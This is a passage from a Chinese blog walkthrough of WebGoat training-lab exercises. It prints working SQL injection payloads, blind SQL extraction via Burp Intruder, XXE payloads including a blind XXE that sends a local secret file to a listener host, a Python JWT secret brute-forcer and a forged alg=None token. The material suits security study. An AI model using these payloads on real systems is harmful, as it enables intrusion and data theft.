src="https://img-blog.csdnimg.cn/20200815171944214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>而日是POST方式的SQL注入，简单单的类型，直接sqlmap跑一下。<br>步骤：抓包，复制数据包内容，写入一个文件中。然后使用sqlmap直接获取数据库等信息。<br><font color=#F22225 >第八关</font><br><font color=#999AAA ><br>数字类型的SQL注入，通过101可以查看一位用户的数据<br></font></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">101</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200815172806707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>同上。</p><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a>SQL Injection (mitigation)</h3><p><font color=#999AAA >这一关需要使用order by 找出<code>IP address webgoat-prd server</code><br>排序是按照下面的这几个来排的。<br></font><br><img src="https://img-blog.csdnimg.cn/20200815180729994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >开启代理，点击进行抓包。</font><br><img src="https://img-blog.csdnimg.cn/20200815213613843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >可以看到是返回正常的页面了，因为它column是按照hostname来排序的，但是如果将它改一下</font></p><pre class="language-sql" data-language="sql"><code class="language-sql">GET <span class="token operator">/</span>WebGoat<span class="token operator">/</span>SqlInjection<span class="token operator">/</span>servers?<span class="token keyword">column</span><span class="token operator">=</span>m0re HTTP<span class="token operator">/</span><span class="token number">1.1</span></code></pre><p>然后go，就会发现它是返回错误的</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>Whitelabel Error Page<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token operator">&lt;</span>p<span class="token operator">></span>This application has no explicit mapping <span class="token keyword">for</span> /error, so you are seeing this as afallback.<span class="token operator">&lt;</span>/p<span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">'created'</span><span class="token operator">></span>Sat Aug <span class="token number">15</span> <span class="token number">21</span>:38:51 CST <span class="token number">202</span><span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>div<span class="token operator">></span>There was an unexpected error <span class="token punctuation">(</span>type<span class="token operator">=</span>Internal Server Error, <span class="token assign-left variable">status</span><span class="token operator">=</span><span class="token number">500</span><span class="token punctuation">)</span>.<span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>div<span class="token operator">></span>user lacks privilege or object not found: M0RE <span class="token keyword">in</span> statement <span class="token punctuation">[</span>select id, hostname, ip, mac, status, description from servers  where status <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token operator">&amp;</span><span class="token comment">#39;out of order&amp;#39; order by m0re]</span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span></code></pre><p><font color=#999AAA >可以看到<code>order by</code>的参数是m0re，是刚才传入的。然后看返回的报错中<code> id, hostname, ip, mac, status, description</code>这几个都是可以进行排列的参数，表是<code>servers</code>但是有一个没见过就是<code>status</code>，所以<code>servers</code>中的status列中的数据才是webgoat-prd 的服务器的IP地址。</p><pre class="language-bash" data-language="bash"><code class="language-bash">GET /WebGoat/SqlInjection/servers?column<span class="token operator">=</span>case%20when%20<span class="token punctuation">(</span>substring<span class="token punctuation">((</span>select%20ip%20from%20servers%20where%20hostname<span class="token operator">=</span>%27webgoat-prd%27<span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span>%271%27<span class="token punctuation">)</span>%20then%20id%20else%20description%20end HTTP/1.1</code></pre><p><font color=#999AAA >这个是需要进行<br>抓取到发送到intruder模块进行爆破。</font><br><img src="https://img-blog.csdnimg.cn/20200815202715536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA ><br>构造payload</font>，选择爆破方式为Cluster bomb</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">case</span><span class="token operator">%</span><span class="token number">20</span>when<span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">%</span><span class="token number">20</span>ip<span class="token operator">%</span><span class="token number">20</span>from<span class="token operator">%</span><span class="token number">20</span>servers<span class="token operator">%</span><span class="token number">20</span>where<span class="token operator">%</span><span class="token number">20</span>hostname<span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>webgoat<span class="token operator">-</span>prd<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">,</span>§<span class="token number">1</span>§<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">%</span><span class="token number">27</span>§<span class="token number">2</span>§<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>then<span class="token operator">%</span><span class="token number">20</span>id<span class="token operator">%</span><span class="token number">20</span>else<span class="token operator">%</span><span class="token number">20</span>description<span class="token operator">%</span><span class="token number">20</span>end</code></pre><p><img src="https://img-blog.csdnimg.cn/2020081520284545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >再设置payload，第一个payload设置最大为15因为IP地址一般是<code>xxx.xxx.xxx.xxx</code>算上“点”正好15位。第二个payload设置为9，数字(0—9)不过我设置的时候忘了加0了，所以没有的情况就是0了，这个无碍。。</font></p><p><img src="https://img-blog.csdnimg.cn/20200815203045562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >然后开始爆破，完成后手动进行设置comment做一个标记，按照id来排序的，设置个标记(这里使用yes，什么标记都行)</font><br><img src="https://img-blog.csdnimg.cn/20200815203216196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >筛选一下，只查看有标记的记录。勾选。就可以看到了</font><br><img src="https://img-blog.csdnimg.cn/20200815203241823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >这就是所有的了，然后IP地址读取很明显了，直接看着写出来就行</font><br><img src="https://img-blog.csdnimg.cn/20200815204018657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >怎么看IP，举个栗子<br>方法：比如第一个，看两个payload，第一个是1，第二个是1，则IP地址的第一个是1<br>第二个，没有找到第一个payload是2的，所以就是0了。<br>第三个是4<br>第四个，上面没有，也就是”点”的位置。<br>这样就可以得出IP地址的前三位了<code>104.</code>后面的不再啰嗦。<br>总：<code>104.130.219.202</code><br></font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><font color=#999AAA >XXE漏洞的基础知识，可以参考我之前的学习博客——🔑<a href="https://blog.csdn.net/qq_45836474/article/details/107573925">XXE漏洞基础及简单利用</a><br><font color=#F22225 >第三关</font><br><font color=#999AAA ><br>随便提交了一个评论，没发现什么异常的，然后就是在评论区显示出来。</font><br><img src="https://img-blog.csdnimg.cn/20200816000903975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>尝试抓包查看，发现了XML</p><p><img src="https://img-blog.csdnimg.cn/20200816000721653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>直接构造简单的XML来提交</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">m0re</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span><span class="token punctuation">></span></span>&lt;!ENTITY m0re SYSTEM "file:///C:/"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&m0re;">&amp;m0re;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span></code></pre><p>因为我是在windows系统中搭建的环境，所以读取C盘内容<br>如果是linux系统的话，就使用<code>file:///</code><br><img src="https://img-blog.csdnimg.cn/20200816002235579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第四关</font><br><font color=#999AAA >这次抓到的包是这样的<br><img src="https://img-blog.csdnimg.cn/20200816002549432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>有一点是，这个<code>Content-Type</code>是json，上一题是XML，所以把这里进行一下修改，就可以，然后XML实体就使用上一题的就可以<br><img src="https://img-blog.csdnimg.cn/20200816003022834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发包，成功</font><br><img src="https://img-blog.csdnimg.cn/20200816003118149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第七关Blind XXE assignment</font></p><p><font color=#999AAA >在webwolf上传外部XML文件<code>m0re.dtd</code></p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload  "&lt;!ENTITY m0re SYSTEM 'http://127.0.0.1:8081/landing?text=%file;'>"></code></pre><p><img src="https://img-blog.csdnimg.cn/20200817113030131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >然后抓包修改，请求利用这个外部XML<br><img src="https://img-blog.csdnimg.cn/20200817114119981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >payload如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % file SYSTEM "file:///C:\Users\18101\.webgoat-8.0.0.M15\XXE/secret.txt">&lt;!ENTITY % zxcv SYSTEM "http://127.0.0.1:8081/files/webgoat/m0re.dtd">%zxcv;%payload;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&m0re;">&amp;m0re;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span></code></pre><p><font color=#999AAA >解释：因为我的是windows系统来搭建的，中间除了一点小差错，是jdk版本的原因，导致靶场无法访问，所以我又换了一个版本相对较低的靶场。这个webwolf的默认端口是8081，所以payload里面是8081。<br><code>http://127.0.0.1:8081/files/webgoat/m0re.dtd</code>这个路径是<code>http://127.0.0.1:8081/files/&#123;username&#125;/&#123;filename&#125;</code>，其他的也没什么了。<br>blind XXE就是没有回显的，所以去webwolf中查就是了。<br><img src="https://img-blog.csdnimg.cn/20200817120512583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p><font color=#999AAA >显示的内容需要进行URL解码后提交评论。</p><p><img src="https://img-blog.csdnimg.cn/20200817120621642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="3-Authentication-Flaws"><a href="#3-Authentication-Flaws" class="headerlink" title="3.Authentication Flaws"></a>3.Authentication Flaws</h2><h3 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a>Authentication Bypasses</h3><p><font color=#999AAA >身份验证缺陷——看完前面lesson去做第一关不难，只需要进行尝试删除或者修改参数就可以了。这里是进行了修改，删除没有成功。<br><img src="https://img-blog.csdnimg.cn/20200817131951956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="JWT-tokens"><a href="#JWT-tokens" class="headerlink" title="JWT tokens"></a>JWT tokens</h3><p><font color=#999AAA >关于JWT tokens，之前好像是isCC有这么一道题，涉及的这个知识。之前题目是被不知名大佬搞坏了，所以没能复现成功，这次正好学习一下。</p><p><font color=#999AAA >尝试更改收到的token并通过更改token成为管理员用户。<br>token的组成，三部分：Header、Claims、Signature<br><img src="https://img-blog.csdnimg.cn/20200817143252541.png" alt="m0re" loading="lazy"><br><font color=#999AAA >而且token是经过base64编码过的。<br>用户获取token需要经过下面这一系列步骤：</p><p><img src="https://img-blog.csdnimg.cn/20200817144100191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >用户输入用户名和密码，提交登录信息给服务器，然后创建一个JWT返回给浏览器，浏览器将token发送到授权的Header头中，服务器检验token的值，从token中验明用户身份信息，验证身份后就会返回给用户相应的信息。<br><font color=#F22225 >第四关</font><br><font color=#999AAA >这一关，可能是环境的问题，抓包获取可能存在问题，抓取的数据包没有发现token，建议搭建环境还是去linux系统或者使用docker进行搭建吧。<br>这里说一下方法和知识点。<br>抓取到数据包后分别对token的三个部分进行base64解码，Header部分后面的是加密算法，可将其改为none<br>也就是图中部分<br><img src="https://img-blog.csdnimg.cn/20200817163027242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在第二部分查看到与admin相关的部分，然后就是将它的参数修改一下。这种类型的题目是JWT中的基础部分，只需要修改token的值就可以了。<br>然后复制回burp中，进行发包。思路大概就是这个样子。<br><font color=#F22225 >第五关</font><br><font color=#999AAA >JWT cracking——爆破，需要使用python脚本进行爆破，前提需自备字典。字典够强，就可以跑出来——<a href="https://wws.lanzous.com/icZOyfpz24b">我用的字典，点击下载</a><br>可以用我现在用的这个试试。测试呢嘛，就直接在源码里找到密码插进去就行。<br>python脚本——来自freebuf大佬阿信</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> termcolor<span class="token keyword">import</span> jwt<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    jwt_str <span class="token operator">=</span> <span class="token string">R'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.m-jSyfYEsVzD3CBI6N39wZ7AcdKdp_GiO7F_Ym12u-0'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'C:\\Users\\18101\\Desktop\\m0re.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            key_ <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwt_str<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> key<span class="token operator">=</span>key_<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\bfound it -->'</span><span class="token punctuation">,</span> termcolor<span class="token punctuation">.</span>colored<span class="token punctuation">(</span>key_<span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;--'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> <span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAudienceError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ImmatureSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\bfound it -->'</span><span class="token punctuation">,</span> termcolor<span class="token punctuation">.</span>colored<span class="token punctuation">(</span>key_<span class="token punctuation">,</span> <span class="token string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;--'</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token string">'\r\btry'</span><span class="token punctuation">,</span> key_<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\bsorry! nothing be found.'</span><span class="token punctuation">)</span></code></pre><p><font color=#999AAA >可能存在的错误：就是需要导入两个模块，分别是<code>termcolor</code>和<code>jwt</code><br><font color=#F22225 >这里有个坑就是，模块安装完后，还是会报错</font><br><code> module &#39;jwt&#39; has no attribute &#39;decode&#39;</code><br>查阅资料了解到python的模块中有<code>jwt</code>和<code>pyjwt</code>两个模块都是引用的<code>jwt</code>，其实不一样，这里使用的是<code>pyjwt</code>所以再安装<code>pyjwt</code>这个模块就好了。<br>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200817162355710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#999AAA >记得将username处的tom改为WebGoat，下面的victory也填入。<br><img src="https://img-blog.csdnimg.cn/20200817182440855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述" loading="lazy"><br>复制到提交处，就可以了。(PS：但是我的环境可能是很有问题的，重新搭建好几遍了，还是答案不对)<br>可以参考一下这位师傅的博客，过程没问题，就是答案提交了不正确。也不纠结了。pass！参考链接——<a href="https://www.jianshu.com/p/d2f9815758f4">https://www.jianshu.com/p/d2f9815758f4</a><br><font color=#F22225 >第七关Refreshing a token</font><br><font color=#999AAA ></p><p>点击这里查看日志。<br><img src="https://img-blog.csdnimg.cn/20200817182823546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在日志文件中发现历史记录的token，也就是过期的，和提交页面的URL，如下：<br><img src="https://img-blog.csdnimg.cn/20200817183007750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>解码这个token，然后发现缺少了typ，既然是已经过期了的，那么时间肯定是不合适的。查阅资料了解到token的时间设定</p><blockquote><p>其中iat是token生成的时间，exp是token失效的时间，也就是直接改exp就行了。这个时间是根据1970计算机的时间纪元来计算的，也就是得知道当前的时间是多少，</p></blockquote><p>回到主页面，其中除了checkout，其他的点击了都是没有其他效果的。<br><img src="https://img-blog.csdnimg.cn/20200818184747661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>所以就只能选择在这个地方入手了。<br>思路：抓包，修改token。</p><p><img src="https://img-blog.csdnimg.cn/20200818210412128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>返回不是用户tom，所以还是用到那个过期的token，但是日期是不正确的，<br><img src="https://img-blog.csdnimg.cn/20200818212605852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>所以需要获取当前时间，然后进行编码。<br>时间获取：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200818210558583.png#pic_center" alt="m0re" loading="lazy"><br>将这个时间加长一点。就可以变为有效期的token了。因为原本的token默认使用<code>HS512</code>来hash，还需要secret值，爆破方式上一关的脚本可以。然后再进行base64编码。<br>懒得爆破了，所以就学习知乎大师傅的方法，直接将不hash，直接将alg改为None。然后进行base64编码。后面的签名也可以不加，直接下面两种组合，构成payload。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token string">"alg"</span><span class="token builtin class-name">:</span><span class="token string">"None"</span><span class="token punctuation">&#125;</span><span class="token operator">==</span><span class="token operator">></span>eyJhbGciOiJOb25lIn0<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"iat"</span>:1526131411,<span class="token string">"exp"</span>:1597757030,<span class="token string">"admin"</span><span class="token builtin class-name">:</span><span class="token string">"false"</span>,<span class="token string">"user"</span><span class="token builtin class-name">:</span><span class="token string">"Tom"</span><span class="token punctuation">&#125;</span><span class="token operator">==</span><span class="token operator">></span>eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTU5Nzc1NzAzMCwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ<span class="token operator">==</span></code></pre><p>提交的payload</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">eyJhbGciOiJOb25lIn0</span><span class="token operator">=</span>.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTU5Nzc1NzAzMCwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ<span class="token operator">==</span>.</code></pre><p>不要忘记了最后的“点”，那是分割符。<br>复制token，粘贴到</p><p><img src="https://img-blog.csdnimg.cn/20200818211815343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>可以看到返回成功了，浏览器中也显示过关。</p><p><img src="https://img-blog.csdnimg.cn/20200818211031949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br><font color=#F22225 >第八关Final challenges</font><br>参考上一关，方法一样。能做出来。<br>首先抓包，在这个位置找到token，然后去修改就可以了。<br><img 